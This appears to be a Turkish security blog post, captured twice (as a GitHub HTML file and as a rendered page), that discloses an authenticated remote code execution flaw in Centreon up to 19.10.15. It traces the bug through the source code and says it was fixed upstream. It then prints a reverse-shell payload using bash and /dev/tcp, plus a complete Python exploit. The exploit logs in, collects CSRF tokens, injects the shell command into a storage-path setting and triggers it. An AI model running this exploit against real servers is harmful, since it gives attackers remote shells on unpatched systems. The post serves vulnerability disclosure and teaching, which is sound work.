=== Content from github.com_41655f9b_20250119_115103.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FEnginDemirbilek%2FEnginDemirbilek.github.io%2Fblob%2Fmaster%2Fcentreon-19.10-rce.html)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FEnginDemirbilek%2FEnginDemirbilek.github.io%2Fblob%2Fmaster%2Fcentreon-19.10-rce.html)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=EnginDemirbilek%2FEnginDemirbilek.github.io)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[EnginDemirbilek](/EnginDemirbilek)
/
**[EnginDemirbilek.github.io](/EnginDemirbilek/EnginDemirbilek.github.io)**
Public

* [Notifications](/login?return_to=%2FEnginDemirbilek%2FEnginDemirbilek.github.io) You must be signed in to change notification settings
* [Fork
  1](/login?return_to=%2FEnginDemirbilek%2FEnginDemirbilek.github.io)
* [Star
   1](/login?return_to=%2FEnginDemirbilek%2FEnginDemirbilek.github.io)

* [Code](/EnginDemirbilek/EnginDemirbilek.github.io)
* [Issues
  0](/EnginDemirbilek/EnginDemirbilek.github.io/issues)
* [Pull requests
  0](/EnginDemirbilek/EnginDemirbilek.github.io/pulls)
* [Actions](/EnginDemirbilek/EnginDemirbilek.github.io/actions)
* [Projects
  0](/EnginDemirbilek/EnginDemirbilek.github.io/projects)
* [Security](/EnginDemirbilek/EnginDemirbilek.github.io/security)
* [Insights](/EnginDemirbilek/EnginDemirbilek.github.io/pulse)

Additional navigation options

* [Code](/EnginDemirbilek/EnginDemirbilek.github.io)
* [Issues](/EnginDemirbilek/EnginDemirbilek.github.io/issues)
* [Pull requests](/EnginDemirbilek/EnginDemirbilek.github.io/pulls)
* [Actions](/EnginDemirbilek/EnginDemirbilek.github.io/actions)
* [Projects](/EnginDemirbilek/EnginDemirbilek.github.io/projects)
* [Security](/EnginDemirbilek/EnginDemirbilek.github.io/security)
* [Insights](/EnginDemirbilek/EnginDemirbilek.github.io/pulse)

## Files

 master
## Breadcrumbs

1. [EnginDemirbilek.github.io](/EnginDemirbilek/EnginDemirbilek.github.io/tree/master)
/
# centreon-19.10-rce.html

Copy path Blame  Blame
## Latest commit

## History

[History](/EnginDemirbilek/EnginDemirbilek.github.io/commits/master/centreon-19.10-rce.html)270 lines (219 loc) · 12.7 KB master
## Breadcrumbs

1. [EnginDemirbilek.github.io](/EnginDemirbilek/EnginDemirbilek.github.io/tree/master)
/
# centreon-19.10-rce.html

Top
## File metadata and controls

* Code
* Blame

270 lines (219 loc) · 12.7 KB[Raw](https://github.com/EnginDemirbilek/EnginDemirbilek.github.io/raw/refs/heads/master/centreon-19.10-rce.html)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270<!doctype html><html lang="en"><head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <meta name="description" content="A Pathetic Soul, "><script async src="https://www.googletagmanager.com/gtag/js?id=UA-161964231-1"></script><script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date());
 gtag('config', 'UA-161964231-1');</script>
 <title>Centreon 19.10.8 Authenticated Remote Code Execution</title>
 <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.3.0/pure-min.css"> <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.1.0/css/font-awesome.min.css"> <link rel="stylesheet" href="/theme/css/pure.css"> <link rel="stylesheet" href="/theme/css/pygments.css">
 <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script> <script src="//cdnjs.cloudflare.com/ajax/libs/fitvids/1.0.1/jquery.fitvids.min.js"></script> <script> $(document).ready(function(){ $(".content").fitVids(); }); </script></head>
<body><div class="pure-g-r" id="layout"> <div class="sidebar sidebar-article pure-u"> <header class="header-article"> <hgroup> <a href="/author/engindemirbilek.html" title="See posts by EnginDemirbilek"> </a> <h2 class="article-info">EnginDemirbilek</h2> <small class="about-author"></small> <h5>Published</h5> <p>Tuesday 25 March 2020</p> <a href="/">&larr;Home</a> </hgroup> </header> </div> <div class="pure-u"> <div class="content"> <section class="post"> <header class="post-header"> <h1>Centreon <= 19.10.15 Authenticated Remote Code Execution</h1> <p class="post-meta"> //Exploit-DEV </p> </header> </section> <p>Merhaba, <a href="https://www.centreon.com/">Centreon</a> adında açık kaynaklı bir ağ yönetim yazılımında <a href="https://www.linkedin.com/in/hekindmn/">Hasan Ekin'in</a> katkılarıyla keşfettiğim Authenticated RCE zafiyetinin detaylı bulumunu anlatıyor olacağım. Bir önceki yazıda olduğu gibi türkçeye kaynak kazandırmak adına makaleyi türkçe kaleme aldım. </p>
 <p><strong>AUTHENTICAD RCE </strong></p><p>Authenticated, zafiyetinin tetiklemesi için geçerli bir kullanıcı gerekli olduğunu belirtir. RCE ise uygulama üzerinden uygulamanın çalıştığı sunucuda sistem kodları çalıştırabilmemize olanak sağlayan zafiyet türüdür.</p>
 <p> <strong>Centreon</strong></p><ol><li>Uygulama indirme linki: <a href="https://download.centreon.com/">Centreon Downloads</a></li><li>Zafiyeti tespit edildiği sürüm: <= 19.10.15 </li><li>Zafiyet giderildi ve Centron tarafından özel teşekkür alındı: <a href="https://github.com/centreon/centreon/pull/8467">https://github.com/centreon/centreon/pull/8467</a></ol><br>
<p><strong>BÖLÜM 1: Uygulama Eldesi</strong></p><p>Kaynak kod analizini keyfi istekler doğrultusunda yapmamızdan ötürü bu uygulamanın adını <a href="https://www.exploit-db.com/search?q=Centreon">Exploit-DB</a> üzerinde gezinirken gördüm. Tespit ettiğimiz zafiyet harici rce zafiyetleride bulunuyordu.Kurulum manuel yapılabileceği gibi yayıncı tarafından hazır OVA ve OVF dosyaları <a href="https://download.centreon.com/">Downloads</a> sayfasına koyulmuş. OVF dosyasını indirip VmwareFUSION ile sanal makineyi ayaklandırdık.</p><br>
<p><strong>Bölüm 2: Kaynak Kod Eldesi</strong></p><p></p><p>Sanal makine üzerinde gezinirken uygulamaya ait dosyaların <strong>/usr/share/centron</strong> dizininde olduğunu saptadık.</p><p><img alt="Centreon" src="/images/Centreon/1.png"></p><p>Kodları daha uygun bir ortadamda IDE üzerinden incelemek için dizini <a href="https://wiki.ubuntu-tr.net/index.php?title=Tar\_komutu\_kullan%C4%B1m%C4%B1">TAR</a> ile sıkıştırdım ve SCP kullanarak ana makineye aktardık.</p><div class="highlight"><pre><span></span>tar -czvf Centreon.tar.gz /usr/share/centron/scp root@CentreonIP:/usr/share/centron/Centreon.tar.gz /tmp/Centreon.tar.gz</pre></div><br>
<p><strong>Bölüm 3: Kaynak Kodun İncelenmesi</strong></p> <p>Dosyaları kendi tercih ettiğim <a href="https://atom.io/"> ATOM</a> idesini kullanarak kurcalamaya başladık.</p><p>Diğer makalelerimde de olduğu gibi kodlar arasında aşağıda belirttiğim sistem fonksiyonlarını aramaya başladık:</p><code>system, exec, shell\_exec, popen, eval, passthru </code></p><p> Boşa geçirilen epey bir saatin sonunda <strong>/www/include/views/graphs/graphStatus/displayServiceStatus.php</strong> dosyasının 302. satırında zafiyetli olabilecek bir noktayı saptadık. <p><img alt="Centreon" src="/images/Centreon/2.png"></p><p>Sistem fonksiyonu olarak <strong>popen()</strong> fonksiyonu kullanılıyor ve <strong>$command\_line </strong>isminde henüz nereden geldiği belli olmayan bir değişkeni parametre olarak alıyordu.Dosya üzerinde biraz daha gezinince <strong>$command\_line</strong> değişkeninin aynı dosyanın data üst satırlarında veritabanından gelen verilerle oluşturulduğunu gördüm.<p><img alt="Centreon" src="/images/Centreon/3.png"></p>Yaklaşık 3 saat 205-215. satırlar arasında yer alan <strong>service\_description</strong>, <strong>host\_name</strong> değişkenleri kontrol edip edemeyeceğimize üzerinde uğraş verdik. Sonunda ilgili değerleri sistem üzerine verebileceğim bir nokta tespit ettiğimizi sanmıştık ki:<p><img alt="Centreon" src="/images/Centreon/4.png"></p>Güncellenilen hiç bir değerin gerekli tablo üzerinde değişmediğini gördük. Zafiyetli fonksiyona parametre olarak verilen veriler <strong>Centreon\_storage</strong> adında bir veritabanı üzerinden geliyordu, arayüzden güncellediklerimse <strong>Centreon</strong> adında bir veritabanında güncelleniyordu.Bu durumun farkına ise aynı dosyanın 128-136. satırları arasında yer alan veritabanı sorgularına bakınca vardık.<p><img alt="Centreon" src="/images/Centreon/5.png"></p><strong>index\_data</strong> isimli bir tablo <strong>Centreon</strong> veritabanı üzerinde bulunmuyordu fakat Centreon\_storage veritabanında bulunuyordu.<p><img alt="Centreon" src="/images/Centreon/6.png"></p>Bir kaç saat uğraşında ardından <strong>Centreon\_storage</strong> veritabanı altında bulunan <strong>index\_data</strong> tablosunu güncelleyebileceğim hiç bir nokta saptayamadık.Bunun yerine diğer girdilere oynamaya çalıştım, graph verileri üzerinde güncelleme yapabileceğim noktalar vardı fakat casting işlemlerinden ötürü string veremiyorduk o yüzden onlarıda es geçtik.Tekrar irdelemenin ardından <strong>$command\_line</strong> değişkenine eklenen farklı bir girdi daha bulduk.<br>116. satırda bulunan <strong>$RRDdatabase\_path</strong> değişkeni.<p><img alt="Centreon" src="/images/Centreon/7.png"></p>Bu değişken <strong>getStatusDBDir($pearDBO)</strong> fonksiyonundan dönen değeri alıyordu. Kodları biraz kurcalayıp ilgili fonksiyonun aynı dosyanın 58-63. satırları arasında tanımlandığını ve ilgili değişkeninde veritabanından geldiğini saptadık.<p><img alt="Centreon" src="/images/Centreon/8.png"></p>Eğer veritabanı üzerinden gelen bu değeri güncellemenin bir yolunu bulabilirsek pekala komutlarımıda çalıştırabilirdik. Tekrar kodları kurcalamakla geçirilen bir sürenin ardından,<strong>/include/Administration/parameters/DB-Func.php</strong> dosyasının 791. satırında tanımlanan <strong>updateODSConfigData</strong> fonksiyonunda ilgili değerin güncellendiğini gördük.<p><img alt="Centreon" src="/images/Centreon/9.png"></p>Yani eğer ki <strong>updateODSConfigData</strong> fonksiyonunu kontrol eden ve kullanıcıdan girdi alan bir nokta bulursak zafiyeti tetikleyebilirdik. IDElerin arama özelliğini kullanarak ilgili fonksiyonunun çağırıldığı yerleri saptadık:<p><img alt="Centreon" src="/images/Centreon/10.png"></p>Ilgili noktaya kullanıcı arayüzünden gittiğimde artık RCE'yi tetiklemek için önümüzde herhangi bir engel kalmadı.<p><img alt="Centreon" src="/images/Centreon/11.png"></p>
</p><br>
<p><strong>Bölüm 4: Payload Hazırlanması</strong></p><p>Girdinin önüne ve sonuna eklenen değerlerden kurtulmak için payload taslağımız <strong>; PAYLOAD ; </strong> şeklinde olacak.<br>Reverse shell payload: <strong>bash -i >& /dev/tcp/10.0.0.1/8080 0>&1</strong><br></p><br>
<p><strong>BÖLÜM 5: EXPLOIT</p></strong> Exploit-DB: <a href="https://www.exploit-db.com/exploits/48256">Exploit</a>
 <div class="highlight"><pre><span></span> #!/usr/bin/python
 import requests import sys import warnings from bs4 import BeautifulSoup
 warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
 if len(sys.argv) < 6: print "Usage: ./exploit.py http(s)://url username password listenerIP listenerPort" exit()
 url = sys.argv[1] username = sys.argv[2] password = sys.argv[3] ip = sys.argv[4] port = sys.argv[5]
 req = requests.session() print("[+] Retrieving CSRF token...") loginPage = req.get(url+"/index.php") response = loginPage.text s = BeautifulSoup(response, 'html.parser') Centreon\_token = s.findAll('input')[3].get("value")
 login\_creds = { "useralias": username, "password": password, "submitLogin": "Connect", "Centreon\_token": Centreon\_token }
 print("[+] Sendin login request...") login = req.post(url+"/index.php", login\_creds)
 if "incorrect" not in login.text: print("[+] Logged In, retrieving second token")
 page = url + "/main.get.php?p=50118" second\_token\_req = req.get(page) response = second\_token\_req.text s = BeautifulSoup(response, 'html.parser') second\_token = s.find('input', {'name':'Centreon\_token'})['value']
 payload = { "RRDdatabase\_path": "/var/lib/Centreon/metrics/", "RRDdatabase\_status\_path": ";bash -i >& /dev/tcp/{}/{} 0>&1;".format(ip, port), "RRDdatabase\_nagios\_stats\_path": "/var/lib/Centreon/nagios-perf/", "reporting\_retention": "365", "archive\_retention": "31", "len\_storage\_mysql": "365", "len\_storage\_rrd": "180", "len\_storage\_downtimes": "0", "len\_storage\_comments": "0", "partitioning\_retention": "365", "partitioning\_retention\_forward": "10", "cpartitioning\_backup\_directory": "/var/cache/Centreon/backup", "audit\_log\_option": "1", "audit\_log\_retention": "0", "submitC": "Save", "gopt\_id": "", "o": "storage", "o": "storage", "Centreon\_token": second\_token,
 } print("[+] Sendin payload...") send\_payload = req.post(page, payload)
 trigger\_url= url + "/include/views/graphs/graphStatus/displayServiceStatus.php" print("[+] Triggerring payload...") trigger = req.get(trigger\_url)
 print("[+] Check your listener !...")
 else: print("[-] Wrong credentials or may the system patched.") exit()
</pre></div><br>
<video id="Centreon exploitation" class="video-js vjs-default-skin" controlspreload="auto" width="683" height="384"data-setup="{}"><source src="/images/Centreon/Centreon-exploitpoc.mov" type='video/mp4'></video>
 <div class="hr"></div> <a href="#" class="go-top">Go Top</a><footer class="footer"> <p>&copy; A Pathetic Soul &ndash; Built with <a href="https://github.com/PurePelicanTheme/pure">Pure Theme</a> for <a href="http://blog.getpelican.com/">Pelican</a> </p></footer> </div> </div></div> <script> var $top = $('.go-top');
 // Show or hide the sticky footer button $(window).scroll(function() { if ($(this).scrollTop() > 200) { $top.fadeIn(200); } else { $top.fadeOut(200); } });
 // Animate the scroll to top $top.click(function(event) { event.preventDefault(); $('html, body').animate({scrollTop: 0}, 300); })
 // Makes sure that the href="#" attached to the <a> elements // don't scroll you back up the page. $('body').on('click', 'a[href="#"]', function(event) { event.preventDefault(); }); </script></body></html>

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from engindemirbilek.github.io_661716b1_20250119_115101.html ===

## EnginDemirbilek

##### Published

Tuesday 25 March 2020

[←Home](/)

# Centreon <= 19.10.15 Authenticated Remote Code Execution

//Exploit-DEV

Merhaba, [Centreon](https://www.centreon.com/) adında açık kaynaklı bir ağ yönetim yazılımında [Hasan Ekin'in](https://www.linkedin.com/in/hekindmn/) katkılarıyla keşfettiğim Authenticated RCE zafiyetinin detaylı bulumunu anlatıyor olacağım.
Bir önceki yazıda olduğu gibi türkçeye kaynak kazandırmak adına makaleyi türkçe kaleme aldım.

**AUTHENTICAD RCE**

Authenticated, zafiyetinin tetiklemesi için geçerli bir kullanıcı gerekli olduğunu belirtir. RCE ise uygulama üzerinden uygulamanın çalıştığı sunucuda sistem kodları çalıştırabilmemize olanak sağlayan zafiyet türüdür.

**Centreon**

1. Uygulama indirme linki: [Centreon Downloads](https://download.centreon.com/)
2. Zafiyeti tespit edildiği sürüm: <= 19.10.15
3. Zafiyet giderildi ve Centron tarafından özel teşekkür alındı: <https://github.com/centreon/centreon/pull/8467>

**BÖLÜM 1: Uygulama Eldesi**

Kaynak kod analizini keyfi istekler doğrultusunda yapmamızdan ötürü bu uygulamanın adını [Exploit-DB](https://www.exploit-db.com/search?q=Centreon) üzerinde gezinirken gördüm. Tespit ettiğimiz zafiyet harici rce zafiyetleride bulunuyordu.
Kurulum manuel yapılabileceği gibi yayıncı tarafından hazır OVA ve OVF dosyaları [Downloads](https://download.centreon.com/) sayfasına koyulmuş. OVF dosyasını indirip VmwareFUSION ile sanal makineyi ayaklandırdık.

**Bölüm 2: Kaynak Kod Eldesi**

Sanal makine üzerinde gezinirken uygulamaya ait dosyaların **/usr/share/centron** dizininde olduğunu saptadık.

![Centreon](/images/Centreon/1.png)

Kodları daha uygun bir ortadamda IDE üzerinden incelemek için dizini [TAR](https://wiki.ubuntu-tr.net/index.php?title=Tar_komutu_kullan%C4%B1m%C4%B1) ile sıkıştırdım ve SCP kullanarak ana makineye aktardık.

```
tar -czvf Centreon.tar.gz /usr/share/centron/
scp root@CentreonIP:/usr/share/centron/Centreon.tar.gz /tmp/Centreon.tar.gz

```

**Bölüm 3: Kaynak Kodun İncelenmesi**

Dosyaları kendi tercih ettiğim  [ATOM](https://atom.io/) idesini kullanarak kurcalamaya başladık.

Diğer makalelerimde de olduğu gibi kodlar arasında aşağıda belirttiğim sistem fonksiyonlarını aramaya başladık:

`system, exec, shell_exec, popen, eval, passthru`

Boşa geçirilen epey bir saatin sonunda **/www/include/views/graphs/graphStatus/displayServiceStatus.php** dosyasının 302. satırında zafiyetli olabilecek bir noktayı saptadık.

![Centreon](/images/Centreon/2.png)

Sistem fonksiyonu olarak **popen()** fonksiyonu kullanılıyor ve **$command\_line** isminde henüz nereden geldiği belli olmayan bir değişkeni parametre olarak alıyordu.
Dosya üzerinde biraz daha gezinince **$command\_line** değişkeninin aynı dosyanın data üst satırlarında veritabanından gelen verilerle oluşturulduğunu gördüm.

![Centreon](/images/Centreon/3.png)

Yaklaşık 3 saat 205-215. satırlar arasında yer alan **service\_description**, **host\_name** değişkenleri kontrol edip edemeyeceğimize üzerinde uğraş verdik. Sonunda ilgili değerleri sistem üzerine verebileceğim bir nokta tespit ettiğimizi sanmıştık ki:

![Centreon](/images/Centreon/4.png)

Güncellenilen hiç bir değerin gerekli tablo üzerinde değişmediğini gördük. Zafiyetli fonksiyona parametre olarak verilen veriler **Centreon\_storage** adında bir veritabanı üzerinden geliyordu, arayüzden güncellediklerimse **Centreon** adında bir veritabanında güncelleniyordu.
Bu durumun farkına ise aynı dosyanın 128-136. satırları arasında yer alan veritabanı sorgularına bakınca vardık.

![Centreon](/images/Centreon/5.png)

**index\_data** isimli bir tablo **Centreon** veritabanı üzerinde bulunmuyordu fakat Centreon\_storage veritabanında bulunuyordu.

![Centreon](/images/Centreon/6.png)

Bir kaç saat uğraşında ardından **Centreon\_storage** veritabanı altında bulunan **index\_data** tablosunu güncelleyebileceğim hiç bir nokta saptayamadık.
Bunun yerine diğer girdilere oynamaya çalıştım, graph verileri üzerinde güncelleme yapabileceğim noktalar vardı fakat casting işlemlerinden ötürü string veremiyorduk o yüzden onlarıda es geçtik.
Tekrar irdelemenin ardından **$command\_line** değişkenine eklenen farklı bir girdi daha bulduk.

116. satırda bulunan **$RRDdatabase\_path** değişkeni.

![Centreon](/images/Centreon/7.png)

Bu değişken **getStatusDBDir($pearDBO)** fonksiyonundan dönen değeri alıyordu. Kodları biraz kurcalayıp ilgili fonksiyonun aynı dosyanın 58-63. satırları arasında tanımlandığını ve ilgili değişkeninde veritabanından geldiğini saptadık.

![Centreon](/images/Centreon/8.png)

Eğer veritabanı üzerinden gelen bu değeri güncellemenin bir yolunu bulabilirsek pekala komutlarımıda çalıştırabilirdik. Tekrar kodları kurcalamakla geçirilen bir sürenin ardından,
**/include/Administration/parameters/DB-Func.php** dosyasının 791. satırında tanımlanan **updateODSConfigData** fonksiyonunda ilgili değerin güncellendiğini gördük.

![Centreon](/images/Centreon/9.png)

Yani eğer ki **updateODSConfigData** fonksiyonunu kontrol eden ve kullanıcıdan girdi alan bir nokta bulursak zafiyeti tetikleyebilirdik. IDElerin arama özelliğini kullanarak ilgili fonksiyonunun çağırıldığı yerleri saptadık:

![Centreon](/images/Centreon/10.png)

Ilgili noktaya kullanıcı arayüzünden gittiğimde artık RCE'yi tetiklemek için önümüzde herhangi bir engel kalmadı.

![Centreon](/images/Centreon/11.png)

**Bölüm 4: Payload Hazırlanması**

Girdinin önüne ve sonuna eklenen değerlerden kurtulmak için payload taslağımız **; PAYLOAD ;**  şeklinde olacak.

Reverse shell payload: **bash -i >& /dev/tcp/10.0.0.1/8080 0>&1**

**BÖLÜM 5: EXPLOIT**

Exploit-DB: [Exploit](https://www.exploit-db.com/exploits/48256)
```

      #!/usr/bin/python

      import requests
      import sys
      import warnings
      from bs4 import BeautifulSoup

      warnings.filterwarnings("ignore", category=UserWarning, module='bs4')

      if len(sys.argv) < 6:
      	print "Usage: ./exploit.py http(s)://url username password listenerIP listenerPort"
      	exit()

      url = sys.argv[1]
      username = sys.argv[2]
      password = sys.argv[3]
      ip = sys.argv[4]
      port = sys.argv[5]

      req = requests.session()
      print("[+] Retrieving CSRF token...")
      loginPage = req.get(url+"/index.php")
      response = loginPage.text
      s = BeautifulSoup(response, 'html.parser')
      Centreon_token = s.findAll('input')[3].get("value")

      login_creds = {
          "useralias": username,
          "password": password,
          "submitLogin": "Connect",
          "Centreon_token": Centreon_token
      }

      print("[+] Sendin login request...")
      login = req.post(url+"/index.php", login_creds)

      if "incorrect" not in login.text:
          print("[+] Logged In, retrieving second token")

          page = url + "/main.get.php?p=50118"
          second_token_req = req.get(page)
          response = second_token_req.text
          s = BeautifulSoup(response, 'html.parser')
          second_token = s.find('input', {'name':'Centreon_token'})['value']

          payload = {
              "RRDdatabase_path": "/var/lib/Centreon/metrics/",
              "RRDdatabase_status_path": ";bash -i >& /dev/tcp/{}/{} 0>&1;".format(ip, port),
              "RRDdatabase_nagios_stats_path": "/var/lib/Centreon/nagios-perf/",
              "reporting_retention": "365",
              "archive_retention": "31",
              "len_storage_mysql": "365",
              "len_storage_rrd": "180",
              "len_storage_downtimes": "0",
              "len_storage_comments": "0",
              "partitioning_retention": "365",
              "partitioning_retention_forward": "10",
              "cpartitioning_backup_directory": "/var/cache/Centreon/backup",
              "audit_log_option": "1",
              "audit_log_retention": "0",
              "submitC": "Save",
              "gopt_id": "",
              "o": "storage",
              "o": "storage",
              "Centreon_token": second_token,

          }
          print("[+] Sendin payload...")
          send_payload = req.post(page, payload)

          trigger_url= url + "/include/views/graphs/graphStatus/displayServiceStatus.php"
          print("[+] Triggerring payload...")
          trigger = req.get(trigger_url)

          print("[+] Check your listener !...")

      else:
          print("[-] Wrong credentials or may the system patched.")
          exit()

```

Go Top

© A Pathetic Soul –
Built with [Pure Theme](https://github.com/PurePelicanTheme/pure)
for [Pelican](http://blog.getpelican.com/)


